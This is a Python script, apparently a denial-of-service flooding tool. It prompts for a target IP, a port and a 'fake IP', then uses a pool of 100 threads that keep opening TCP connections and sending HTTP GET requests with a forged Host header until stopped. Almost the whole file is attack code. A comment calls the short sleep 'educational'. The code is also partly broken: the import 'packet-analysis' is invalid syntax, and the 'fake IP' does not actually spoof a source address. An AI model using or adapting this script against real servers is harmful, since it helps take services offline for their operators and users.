import socket
import threading
import logging
import time
from concurrent.futures import ThreadPoolExecutor
from threading import Event
import packet-analysis

# logging
logging.basicConfig(level=logging.INFO)

# Parameters
ip_addr = input("Enter target IP: ")  # Parameterized target IP
port = int(input("Enter target port: "))  # Parameterized target port
fk_ip = input("Enter fake IP: ")  # Parameterized fake IP
max_threads = 100  # Maximum threads for thread pool

# stop event by ctrl+c
stop_event = Event()

# Function for handling each attack connection
""" 
     This is main function in which connection is made through socket.
     socket.AF_INET tell to make connection through internet and socket.SOCK_STREAM tell that we use TCP protocol 
"""
def attack():
    while not stop_event.is_set():
        try:
            # Create socket connection with timeout
            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_connection.settimeout(5)  # Set timeout of 5 seconds
            
            # Connect to the target server
            socket_connection.connect((ip_addr, port))
            logging.info(f"Connected to {ip_addr}:{port}")
            
            # Send a fake request
            socket_connection.sendto(f"GET / HTTP/1.1\r\nHost: {fk_ip}\r\n\r\n".encode('ascii'), (ip_addr, port))
            
            # Sleep for a short period to simulate rate limiting (educational purpose)
            time.sleep(0.1)  # Sleep for 100ms between requests
            
        except socket.error as e:
            logging.error(f"Socket error: {e}")
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
        finally:
            socket_connection.close()

# Function to gracefully shut down the threads
def stop_threads():
    logging.info("Stopping threads...")
    stop_event.set()

# Start attack threads using thread pool
def start_attack():
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        # Submit tasks to the thread pool
        for _ in range(200):  # Submit 200 tasks
            executor.submit(attack)

# Run the attack
try:
    start_attack()

except KeyboardInterrupt:
    # shutdown on Ctrl+C
    stop_threads()
    logging.info("Attack stopped .")

